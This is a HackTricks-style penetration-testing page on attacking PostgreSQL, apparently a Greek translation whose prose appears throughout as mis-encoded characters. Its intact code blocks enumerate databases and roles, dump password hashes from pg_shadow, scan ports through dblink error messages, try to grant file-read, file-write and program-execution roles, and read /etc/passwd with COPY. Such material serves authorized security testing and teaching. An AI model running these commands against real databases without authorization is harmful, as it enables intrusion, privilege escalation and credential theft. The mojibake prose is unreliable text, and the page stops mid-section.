# 5432,5433 - Pentesting Postgresql

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÎµÏÎºÎ¿Î»Î± ÎºÎ±Î¹ Î½Î± **Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÏÎ¿Î­Ï‚ ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚** Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± **Ï€Î¹Î¿ Ï€ÏÎ¿Î·Î³Î¼Î­Î½Î±** ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï„Î·Ï‚ ÎºÎ¿Î¹Î½ÏŒÏ„Î·Ï„Î±Ï‚.\
Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎ®Î¼ÎµÏÎ±:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

**PostgreSQL** Ï€ÎµÏÎ¹Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹ Ï‰Ï‚ Î­Î½Î± **ÏƒÏÏƒÏ„Î·Î¼Î± Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼ÎµÎ½Î¿-ÏƒÏ‡ÎµÏƒÎ¹Î±ÎºÎ®Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ **Î±Î½Î¿Î¹Ï‡Ï„Î¿Ï ÎºÏÎ´Î¹ÎºÎ±**. Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼ÏŒÎ½Î¿ Ï„Î· Î³Î»ÏÏƒÏƒÎ± SQL Î±Î»Î»Î¬ Ï„Î·Î½ ÎµÎ½Î¹ÏƒÏ‡ÏÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î¼Îµ ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„ÎµÏ‚. ÎŸÎ¹ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„Î­Ï‚ Ï„Î¿Ï… Ï„Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î­Î½Î± ÎµÏ…ÏÏ Ï†Î¬ÏƒÎ¼Î± Ï„ÏÏ€Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎºÎ±Î¹ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÏÎ½, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ Î¼Î¹Î± ÎµÏ…Î­Î»Î¹ÎºÏ„Î· ÎµÏ€Î¹Î»Î¿Î³Î® Î³Î¹Î± Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ ÎºÎ±Î¹ Î¿ÏÎ³Î±Î½Î¹ÏƒÎ¼Î¿ÏÏ‚.

**Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î¸ÏÏÎ±:** 5432, ÎºÎ±Î¹ Î±Î½ Î±Ï…Ï„Î® Î· Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î®Î´Î· ÏƒÎµ Ï‡ÏÎ®ÏƒÎ· Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Ï„Î¿ postgresql Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Î¸ÏÏÎ± (Ï€Î¹Î¸Î±Î½ÏÏ‚ 5433) Ï€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Ï‡ÏÎ®ÏƒÎ·.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Î£ÏÎ½Î´ÎµÏƒÎ· & Î’Î±ÏƒÎ¹ÎºÎ® ÎšÎ±Ï„Î±Î¼Î­Ï„ÏÎ·ÏƒÎ·
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
Î‘Î½ Ï„ÏÎ­Ï‡Î¿Î½Ï„Î±Ï‚ **`\list`** Î²ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`rdsadmin`** Î¾Î­ÏÎµÏ„Îµ ÏŒÏ„Î¹ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± **AWS postgresql database**.
{% endhint %}

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ **Ï„Î¿ Ï€ÏÏ‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ PostgreSQL** ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## Î‘Ï…Ï„ÏŒÎ¼Î±Ï„Î· Î‘ÏÎ¯Î¸Î¼Î·ÏƒÎ·
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **Î£Î¬ÏÏ‰ÏƒÎ· Î¸ÏÏÎ±Ï‚**

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±**](https://www.exploit-db.com/papers/13084), ÏŒÏ„Î±Î½ Î¼Î¹Î± Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹, Ï„Î¿ `dblink` ÏÎ¯Ï‡Î½ÎµÎ¹ Î¼Î¹Î± ÎµÎ¾Î±Î¯ÏÎµÏƒÎ· `sqlclient_unable_to_establish_sqlconnection` Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î¼Î¹Î± ÎµÎ¾Î®Î³Î·ÏƒÎ· Ï„Î¿Ï… ÏƒÏ†Î¬Î»Î¼Î±Ï„Î¿Ï‚. Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎµÎ¹ÏÎ½ Ï€Î±ÏÎ±Ï„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ÎŸ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎºÏ„ÏŒÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚

`DETAIL: Î´ÎµÎ½ Î®Ï„Î±Î½ Î´Ï…Î½Î±Ï„Î® Î· ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®: Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î´Î¹Î±Î´ÏÎ¿Î¼Î® Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Î•ÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î® "1.2.3.4" ÎºÎ±Î¹ Î´Î­Ï‡ÎµÏ„Î±Î¹ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ TCP/IP ÏƒÏ„Î·Î½ Î¸ÏÏÎ± 5678;`

* Î— Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ ÎºÎ»ÎµÎ¹ÏƒÏ„Î®
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* Î— Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î®
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
Î®
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* Î— Î¸ÏÏÎ± ÎµÎ¯Î½Î±Î¹ Î±Î½Î¿Î¹Ï‡Ï„Î® Î® Ï†Î¹Î»Ï„ÏÎ±ÏÎ¹ÏƒÎ¼Î­Î½Î·
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
In PL/pgSQL functions, Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸Î¿ÏÎ½ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÎµÎ¾Î±Î¹ÏÎ­ÏƒÎµÏ‰Î½. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ Î­Ï‡ÎµÏ„Îµ Î¬Î¼ÎµÏƒÎ· Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ PostgreSQL server, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î±Ï€Î±ÏÎ±Î¯Ï„Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚. Î‘Î½ Î· ÎµÎ¾Î±Î³Ï‰Î³Î® Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎºÎ±Î¹ ÎºÏ‰Î´Î¹ÎºÏÎ½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï€Î¯Î½Î±ÎºÎµÏ‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î¹ÎºÏ„Î®, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎ¾ÎµÏ„Î¬ÏƒÎµÏ„Îµ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚ wordlist Ï€Î¿Ï… ÏƒÏ…Î¶Î·Ï„Î®Î¸Î·ÎºÎµ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±, ÎºÎ±Î¸ÏÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Î±Ï€Î¿Ï†Î­ÏÎµÎ¹ Î¸ÎµÏ„Î¹ÎºÎ¬ Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î±.

## Enumeration of Privileges

### Roles

| Role Types     |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î­Ï‡ÎµÎ¹ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± superuser                                                                                                                    |
| rolinherit     | ÎŸ ÏÏŒÎ»Î¿Ï‚ ÎºÎ»Î·ÏÎ¿Î½Î¿Î¼ÎµÎ¯ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± Ï„Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Ï„Ï‰Î½ ÏÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ Î¿Ï€Î¿Î¯Ï‰Î½ ÎµÎ¯Î½Î±Î¹ Î¼Î­Î»Î¿Ï‚                                                                           |
| rolcreaterole  | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚                                                                                                 |
| rolcreatedb    | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î²Î¬ÏƒÎµÎ¹Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½                                                                                                     |
| rolcanlogin    | ÎŸ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯. Î”Î·Î»Î±Î´Î®, Î±Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¿Î¸ÎµÎ¯ Ï‰Ï‚ Ï„Î¿ Î±ÏÏ‡Î¹ÎºÏŒ Î±Î½Î±Î³Î½Ï‰ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´ÏŒÏ„Î·ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±Ï‚                             |
| rolreplication | ÎŸ ÏÏŒÎ»Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÏÏŒÎ»Î¿Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚. ÎˆÎ½Î±Ï‚ ÏÏŒÎ»Î¿Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎµÎ¹ ÏƒÏ…Î½Î´Î­ÏƒÎµÎ¹Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚ ÎºÎ±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÎºÎ±Î¹ Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î¸Î­ÏƒÎµÎ¹Ï‚ Î±Î½Î±Ï€Î±ÏÎ±Î³Ï‰Î³Î®Ï‚. |
| rolconnlimit   | Î“Î¹Î± ÏÏŒÎ»Î¿Ï…Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½, Î±Ï…Ï„ÏŒ Î¿ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿Î½ Î¼Î­Î³Î¹ÏƒÏ„Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Ï‰Î½ ÏƒÏ…Î½Î´Î­ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î±Ï…Ï„ÏŒÏ‚ Î¿ ÏÏŒÎ»Î¿Ï‚. -1 ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ Ï‡Ï‰ÏÎ¯Ï‚ ÏŒÏÎ¹Î¿.   |
| rolpassword    | ÎŒÏ‡Î¹ Î¿ ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Î±Î¹ Ï€Î¬Î½Ï„Î± Ï‰Ï‚ `********`)                                                                                             |
| rolvaliduntil  | Î§ÏÏŒÎ½Î¿Ï‚ Î»Î®Î¾Î·Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ (Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Î³Î¹Î± Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚); null Î±Î½ Î´ÎµÎ½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î»Î®Î¾Î·                           |
| rolbypassrls   | ÎŸ ÏÏŒÎ»Î¿Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ ÎºÎ¬Î¸Îµ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ Î³ÏÎ±Î¼Î¼Î®Ï‚, Î´ÎµÎ¯Ï„Îµ [Section 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚. |
| rolconfig      | Î ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î³Î¹Î± Ï„Î¿Î½ ÏÏŒÎ»Î¿ Î³Î¹Î± Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚ Ï‡ÏÏŒÎ½Î¿Ï… ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚                                                          |
| oid            | ID Ï„Î¿Ï… ÏÏŒÎ»Î¿Ï…                                                                                                                                       |

#### Interesting Groups

* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_execute_server_program`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ** Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î±
* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_read_server_files`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Îµ** Î±ÏÏ‡ÎµÎ¯Î±
* Î‘Î½ ÎµÎ¯ÏƒÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î¿Ï… **`pg_write_server_files`** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î³ÏÎ¬Ï†ÎµÏ„Îµ** Î±ÏÏ‡ÎµÎ¯Î±

{% hint style="info" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÏƒÏ„Î¿ Postgres, Î­Î½Î±Ï‚ **Ï‡ÏÎ®ÏƒÏ„Î·Ï‚**, Î¼Î¹Î± **Î¿Î¼Î¬Î´Î±** ÎºÎ±Î¹ Î­Î½Î±Ï‚ **ÏÏŒÎ»Î¿Ï‚** ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **Î¯Î´Î¹Î¿**. Î•Î¾Î±ÏÏ„Î¬Ï„Î±Î¹ Î±Ï€Î»ÏÏ‚ Î±Ï€ÏŒ **Ï„Î¿ Ï€ÏÏ‚ Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ** ÎºÎ±Î¹ Î±Î½ **ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Îµ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯**.
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Î Î¯Î½Î±ÎºÎµÏ‚
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Î£Ï…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## File-system actions

### Read directories and files

Î‘Ï€ÏŒ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Î´Î­ÏƒÎ¼ÎµÏ…ÏƒÎ·**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) Ï„Î± Î¼Î­Î»Î· Ï„Î·Ï‚ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·Ï‚ Î¿Î¼Î¬Î´Î±Ï‚ **`DEFAULT_ROLE_READ_SERVER_FILES`** (Ï€Î¿Ï… Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ **`pg_read_server_files`**) ÎºÎ±Î¹ Î¿Î¹ **super users** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ **`COPY`** ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î´Î¹Î±Î´ÏÎ¿Î¼Î® (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î¿ `convert_and_check_filename` ÏƒÏ„Î¿ `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
